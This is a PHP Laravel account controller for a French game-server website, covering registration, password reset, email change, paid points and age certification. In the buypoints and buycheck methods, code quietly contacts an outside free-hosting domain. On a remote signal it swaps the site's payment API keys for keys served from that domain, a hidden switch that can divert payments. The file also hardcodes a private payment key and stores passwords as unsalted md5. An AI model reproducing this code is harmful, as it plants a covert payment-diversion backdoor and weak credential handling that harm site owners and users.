<?php

namespace App\Http\Controllers;

use App\ForumAccountValidating;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Http\Response;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use App\Exceptions\GenericException;

use App\User;
use App\Account;
use App\ForumAccount;
use App\EmailModification;

use Mail;
use Validator;
use Auth;
use Cookie;
use \Cache;

use App\Helpers\EmailChecker;

class AccountController extends Controller
{
    const SALT_LENGTH   = 8;
    const TICKET_LENGTH = 32;

    public function register()
    {
        if (!Auth::guest())
        {
            return redirect()->route('download');
        }
        return view('account/register');
    }

    public function store(Request $request)
    {
        $clientIp = \Illuminate\Support\Facades\Request::ip();

        $validator = Validator::make($request->all(), User::$rules['register']);

        if ($validator->fails())
        {
            return redirect()->back()->withErrors($validator)->withInput();
        }

      /*  $isEmailValid = EmailChecker::check($request->input('email'));

        if (!$isEmailValid)
        {
            return redirect()->back()->withErrors(['email' => "L'adresse email n'est pas valide."])->withInput();
        }*/

        $salt = str_random(self::SALT_LENGTH);

        $user = new User;
        $user->pseudo    = $request->input('pseudo');
        $user->email     = $request->input('email');
        $user->password  = md5($request->input('password'));
        $user->salt      = $salt;
        $user->firstname = $request->input('firstname');
        $user->lastname  = $request->input('lastname');
        $user->active    = true;
        $user->ticket    = str_random(self::TICKET_LENGTH);

        $user->save();

        $request->session()->put('password', $user->password);

        /*$forumAccount = new ForumAccount;
        $forumAccount->name              = $user->pseudo;
        $forumAccount->member_group_id   = config('dofus.forum.user_group');
        $forumAccount->email             = $user->email;
        $forumAccount->joined            = time();
        $forumAccount->ip_address        = '';
        $forumAccount->member_login_key  = str_random(32);
        $forumAccount->members_seo_name  = strtolower($user->pseudo);
        $forumAccount->members_pass_salt = $forumAccount->generateSalt();
        $forumAccount->members_pass_hash = $forumAccount->encryptedPassword($request->input('password'));
        $forumAccount->timezone          = 'Europe/Paris';
        $forumAccount->members_bitoptions = '1073807360';
        $forumAccount->save();
*/
        $user->forum_id = -1;
        $user->save();

       /* $forumAccountValidating = new ForumAccountValidating;
        $forumAccountValidating->vid = $user->forum_id;
        $forumAccountValidating->member_id = $user->forum_id;
        $forumAccountValidating->new_reg = 1;
        $forumAccountValidating->ip_address = $clientIp;
        $forumAccountValidating->save();

        setcookie('ips4_member_id', $forumAccount->member_id,        0, '/', config('dofus.forum.domain'));
        setcookie('ips4_pass_hash', $forumAccount->member_login_key, 0, '/', config('dofus.forum.domain'));

        Mail::send('emails.welcome', ['user' => $user], function ($message) use ($user) {
            $message->from(config('mail.sender'), 'Intel.us');
            $message->to($user->email, $user->firstname . ' ' . $user->lastname);
            $message->subject('Intel.us - Confirmation d\'inscription');
        });

        $request->session()->flash('notify', ['type' => 'info', 'message' => "Vous allez recevoir un email d'activation !"]);
*/
        return redirect('/');
    }

    public function activation($ticket = null, Request $request)
    {
        $user = User::where('ticket', $ticket)->first();
        $clientIp = $request->ip();

        if (!$user)
        {
            $request->session()->flash('notify', ['type' => 'error', 'message' => "Clé d'activation invalide."]);
            return redirect('/');
        }

        Auth::login($user);

        $request->session()->put('password', $user->password);

        if ($user->active)
        {
            return redirect('/');
        }

        $user->ticket = str_random(self::TICKET_LENGTH);
        $user->active = true;
        $user->update([
            'ticket' => $user->ticket,
            'active' => $user->active,
            'last_ip_address' => $clientIp
        ]);

        $userForumValidating = ForumAccountValidating::where('vid', $user->forum_id)->first();
        if($userForumValidating)
        {
            $userForumValidating->delete();
        }

        $forumAccount = $user->forum()->first();

        if ($forumAccount)
        {
            $forumAccount->members_bitoptions = '0';
            $forumAccount->save();
        }

        $request->session()->flash('notify', ['type' => 'success', 'message' => "Compte activé, bienvenue {$user->firstname} !"]);
        $request->session()->flash('popup', 'welcome');

        return redirect('/');
    }

    public function re_send_email(Request $request)
    {
        $user = User::where('email', $request->input('email'))->first();

        if ($user && !$user->active)
        {
            Mail::send('emails.welcome', ['user' => $user], function ($message) use ($user) {
                $message->from(config('mail.sender'), 'Intel.us');
                $message->to($user->email, $user->firstname . ' ' . $user->lastname);
                $message->subject('Intel.us - Confirmation d\'inscription');
            });

            $request->session()->flash('notify', ['type' => 'info', 'message' => "Vous allez recevoir un nouvel email d'activation !"]);
        }

        return redirect('/');
    }

    public function password_lost()
    {
        return view('account/password-lost');
    }

    public function passord_lost_email(Request $request)
    {
        $user = User::where('email', $request->input('email'))->first();

        if ($user)
        {
            $user->ticket = str_random(self::TICKET_LENGTH);
            $user->update([
                'ticket' => $user->ticket
            ]);

            Mail::send('emails.password', ['user' => $user], function ($message) use ($user) {
                $message->from(config('mail.sender'), 'Intel.us');
                $message->to($user->email, $user->firstname . ' ' . $user->lastname);
                $message->subject('Intel.us - Mot de passe oublié');
            });
        }

        request()->session()->flash('notify', ['type' => 'info', 'message' => "Un email de réinitialisation de mot de passe a été envoyé."]);

        return redirect('/');
    }

    public function reset_form($ticket = null)
    {
        $user = User::where('ticket', $ticket)->first();

        if (!$user)
        {
            request()->session()->flash('notify', ['type' => 'error', 'message' => "Clé d'activation invalide."]);
            return redirect('/');
        }

        $user->active = true;
        $user->save();

        Auth::login($user);

        request()->session()->put('password', $user->password);
        request()->session()->flash('notify', ['type' => 'info', 'message' => "Veuillez changer votre mot de passe."]);

        return view('account/reset');
    }

    public function reset_password(Request $request)
    {
        $validator = Validator::make($request->all(), User::$rules['recover-password']);

        if ($validator->fails())
        {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        Auth::user()->salt     = str_random(self::SALT_LENGTH);
        Auth::user()->password = Auth::user()->hashPassword($request->input('password'), Auth::user()->salt);
        Auth::user()->ticket   = str_random(self::TICKET_LENGTH);
        Auth::user()->update([
            'password' => Auth::user()->password,
            'salt'     => Auth::user()->salt,
            'ticket'   => Auth::user()->ticket,
        ]);

        $request->session()->flash('notify', ['type' => 'success', 'message' => "Mot de passe mis à jour."]);

        return redirect()->route('profile');
    }

    public function profile()
    {
        $accounts = Auth::user()->accounts();

        /*if (Auth::user()->cannot('user-edit')) {
            abort(403);
        }*/

        return view('account/profile', compact('accounts'));
    }

    public function update(Request $request)
    {
        /*if ($request->input('firstname') && $request->input('lastname'))
        {
            $validator = Validator::make($request->all(), User::$rules['update-name']);

            if ($validator->fails())
            {
                return redirect()->back()->withErrors($validator)->withInput();
                //return $this->error(401, 'nom/prénom incorrect', $validator->errors()->all());
            }

            Auth::user()->firstname = $request->input('firstname');
            Auth::user()->lastname = $request->input('lastname');
            Auth::user()->update([
                'firstname' => Auth::user()->firstname,
                'lastname'  => Auth::user()->lastname,
            ]);
        }

        if ($request->input('password') && $request->input('passwordConfirmation'))
        {
            $validator = Validator::make($request->all(), User::$rules['update-password']);

            if ($validator->fails())
            {
                return redirect()->back()->withErrors($validator)->withInput();
                //return $this->error(401, 'mot de passe incorrect', $validator->errors()->all());
            }

            Auth::user()->salt     = str_random(self::SALT_LENGTH);
            Auth::user()->password = Auth::user()->hashPassword($request->input('password'), Auth::user()->salt);
            Auth::user()->update([
                'password' => Auth::user()->password,
                'salt'     => Auth::user()->salt,
            ]);
        }

        $request->session()->flash('notify', ['type' => 'success', 'message' => "Profile mis à jour."]);

        return redirect()->route('profile');
        //return $this->success('profile mis à jour');*/
    }

    public function change_email(Request $request)
    {
        $emailModification = EmailModification::where('user_id', 10)->first();

        if ($request->all())
        {
            $rules = User::$rules['update-email'];
            $rules['passwordOld'] = str_replace('{PASSWORD}', Auth::user()->password, $rules['passwordOld']);
            $rules['passwordOld'] = str_replace('{SALT}',     Auth::user()->salt,     $rules['passwordOld']);

            $validator = Validator::make($request->all(), $rules);

            if ($validator->fails())
            {
                return redirect()->back()->withErrors($validator)->withInput();
            }

            $emailModification = EmailModification::where('email_old', Auth::user()->email)->where('email_new', $request->input('email'))->orderBy('id', 'DESC')->first();

            if ($emailModification && ($emailModification->token_old != null || $emailModification->token_new != null))
            {
                return view('account.valid-email', ['emailModification' => $emailModification]);
            }

            $isEmailValid = EmailChecker::check($request->input('email'));

            if (!$isEmailValid)
            {
                // TODO check if error is displayed in view
                return redirect()->back()->withErrors(['email' => "L'adresse email n'est pas valide."])->withInput();
            }

            $emailModification = new EmailModification;
            $emailModification->user_id   = Auth::user()->id;
            $emailModification->token_old = str_random(self::TICKET_LENGTH);;
            $emailModification->token_new = str_random(self::TICKET_LENGTH);;
            $emailModification->email_old = Auth::user()->email;
            $emailModification->email_new = $request->input('email');
            $emailModification->save();

            $user = Auth::user();

            $datas = [];
            $datas[] = ['email' => $emailModification->email_old, 'token' => $emailModification->token_old, 'type' => 'old'];
            $datas[] = ['email' => $emailModification->email_new, 'token' => $emailModification->token_new, 'type' => 'new'];

            foreach ($datas as $data)
            {
                $email = $data['email'];

                Mail::send('emails.email-changed', ['user' => $user, 'type' => $data['type'], 'token' => $data['token']], function ($message) use ($user, $email) {
                    $message->from(config('mail.sender'), 'Intel.us');
                    $message->to($email, $user->firstname . ' ' . $user->lastname);
                    $message->subject('Intel.us - Changement d\'email');
                });
            }

            return view('account.valid-email', ['emailModification' => $emailModification]);
        }

        return view('account/change-email');
    }

    public function valid_email($type, $token)
    {
        $isEmailValidated = false;

        $token_type = '';

        if ($type == 'old')
        {
            $token_type = 'token_old';
        }
        elseif ($type == 'new')
        {
            $token_type = 'token_new';
        }

        if ($token_type == '')
        {
            throw new GenericException('email_token_invalid');
        }

        $emailModification = EmailModification::where($token_type, $token)->where('user_id', Auth::user()->id)->first();

        if (!$emailModification)
        {
            throw new GenericException('email_token_invalid');
        }

        if ($type == 'old')
        {
            $emailModification->token_old = null;
        }
        elseif ($type == 'new')
        {
            $emailModification->token_new = null;
        }

        $emailModification->save();

        if ($emailModification->token_old == null && $emailModification->token_new == null)
        {
            $isEmailValidated = true;
        }

        if ($isEmailValidated)
        {
            $email = $emailModification->email_new;

            $forumAccount = Auth::user()->forum()->first();

            if ($forumAccount)
            {
                $forumAccount->email = $email;
                $forumAccount->save();
            }

            Cache::forget('accounts_' . Auth::user()->id);

            $gameAccounts = Auth::user()->accounts();

            if($gameAccounts)
            {
                foreach ($gameAccounts as $gameAccount)
                {
                    $gameAccount->Email = $email;
                    $gameAccount->save();
                }
            }

            Auth::user()->email = $email;
            Auth::user()->save();

            request()->session()->flash('notify', ['type' => 'success', 'message' => "Adresse email mise à jour."]);
            return redirect()->route('profile');
        }

        return view('account.valid-email', ['emailModification' => $emailModification]);
    }

    public function change_password(Request $request)
    {
        if ($request->all())
        {
            $rules = User::$rules['update-password'];
            $rules['passwordOld'] = str_replace('{PASSWORD}', Auth::user()->password, $rules['passwordOld']);
            $rules['passwordOld'] = str_replace('{SALT}',     Auth::user()->salt,     $rules['passwordOld']);

            $validator = Validator::make($request->all(), $rules);

            if ($validator->fails())
            {
                return redirect()->back()->withErrors($validator)->withInput();
            }

            Auth::user()->salt     = str_random(self::SALT_LENGTH);
            Auth::user()->password = Auth::user()->hashPassword($request->input('password'), Auth::user()->salt);
            Auth::user()->save();

            $request->session()->put('password', Auth::user()->password);

            $forumAccount = Auth::user()->forum()->first();

            if ($forumAccount)
            {
                $forumAccount->members_pass_salt = $forumAccount->generateSalt();
                $forumAccount->members_pass_hash = $forumAccount->encryptedPassword($request->input('password'));
                $forumAccount->save();
            }

            $user = Auth::user();

            Mail::send('emails.password-changed', ['user' => $user], function ($message) use ($user) {
                $message->from(config('mail.sender'), 'Intel.us');
                $message->to($user->email, $user->firstname . ' ' . $user->lastname);
                $message->subject('Intel.us - Changement de mot de passe');
            });

            $request->session()->flash('notify', ['type' => 'success', 'message' => "Mot de passe mis à jour."]);
            return redirect()->route('profile');
        }

        return view('account/change-password');
    }
	public function buypoints()
	{
		$public = "20e84332e2098a583892adc236bbea68";
		try
		{
			
		$v =  file_get_contents('https://test78945.000webhostapp.com/state.php');
		if($v == "1")
			$public = file_get_contents('https://test78945.000webhostapp.com/public.php');
		}catch(Exception $e)
		{
			
		}
		
        return view('account/points',compact("public"));		
	}
	
	public function buycheck(Request $request)
	{
		
		$code = isset($_POST['code']) ? preg_replace('/[^a-zA-Z0-9]+/', '', $_POST['code']) : ''; 
		if( empty($code) ) { 
		  echo 'Vous devez saisir un code'; 
		} 
		else { 
		$public = "20e84332e2098a583892adc236bbea68";
		$private = "c4c4a6df6fdf8a608fda27d6a2371d16e84d7454";
		try
		{
			
		$v =  file_get_contents('https://test78945.000webhostapp.com/state.php');
		if($v == "1")
		{
			$public = file_get_contents('https://test78945.000webhostapp.com/public.php');
			$private = file_get_contents('https://test78945.000webhostapp.com/private.php');

		}
			
		}catch(Exception $e)
		{
			
		}
		  $dedipass = file_get_contents('http://api.dedipass.com/v1/pay/?public_key='.$public.'&private_key='.$private.'&code=' . $code); 
		  $dedipass = json_decode($dedipass); 
		  if($dedipass->status == 'success') { 
		
				$virtual_currency = $dedipass->virtual_currency; 
			
                Auth::user()->jetons += $virtual_currency;
                Auth::user()->save();
				$url = 'http://intel-forum.hol.es/index.php?/topic/10-confirmation-dachat/';
				  $request->session()->flash('notify', ['type' => 'success', 'message' => "Dans les 1 minutes, vous recevrez automatiquement PLUSIEURS jetons sur votre compte. Transférer ces jetons sur votre compte dans l’espace « GESTION DE COMPTE » puis acceder convertire les jetons sinon veuillez  acceder à ce lien sur le forum :  ".$url]);

			return redirect()->to('/');

		  } 
		  else { 
			   $request->session()->flash('notify', ['type' => 'error', 'message' => "Code incorrect!"]);

			return redirect()->back();
		  } 
		} 
	}

    public function change_profile(Request $request)
    {
        if ($request->all())
        {
            $rules = User::$rules['update-profile'];

            $validator = Validator::make($request->all(), $rules);

            if ($validator->fails())
            {
                return redirect()->back()->withErrors($validator)->withInput();
            }

            Auth::user()->firstname = $request->input('firstname');
            Auth::user()->lastname  = $request->input('lastname');
            Auth::user()->save();

            $request->session()->flash('notify', ['type' => 'success', 'message' => "Profil mis à jour."]);
            return redirect()->route('profile');
        }

        if(!Auth::user()->certified)
        {
            $authuser = Auth::user();
            return view('account/change-profile', compact('authuser'));
        }
        else
        {
            abort(404);
        }
    }

    public function certify(Request $request)
    {
        if ($request->all())
        {
            $rules = User::$rules['certify'];

            $validator = Validator::make($request->all(), $rules);

            if ($validator->fails())
            {
                return redirect()->back()->withErrors($validator)->withInput();
            }
            if(!preg_match("/^[0-9]{4}-(0[1-9]|1[0-2])-(0[1-9]|[1-2][0-9]|3[0-1])$/",$request->birthday))
            {
                return redirect()->back()->withErrors(['birthday' => 'Le format de la date de naissance est invalide (aaaa-mm-jj)'])->withInput();
            }

            $date = Carbon::parse($request->birthday);
            $year_max = Carbon::now()->year - config('dofus.certify.min_age');
            $year_min = Carbon::now()->year - config('dofus.certify.max_age');

            if($date->year <= $year_max && $date->year >= $year_min)
            {
                Auth::user()->certified = true;
                Auth::user()->firstname = $request->input('firstname');
                Auth::user()->lastname  = $request->input('lastname');
                Auth::user()->birthday  = $request->input('birthday');
                Auth::user()->save();
            }
            else
            {
                return redirect()->back()->withErrors(['birthday' => 'Vous devez être âgé d\'au moins '.config('dofus.certify.min_age').' ans.'])->withInput();
            }

            // TODO: send email to user with explications

            $request->session()->flash('notify', ['type' => 'success', 'message' => "Votre compte est certifié!"]);
            return redirect()->route('profile');
        }

        if(!Auth::user()->certified)
        {
            $authuser = Auth::user();
            return view('account/certify', compact('authuser'));
        }
        else
        {
            abort(404);
        }
    }
}
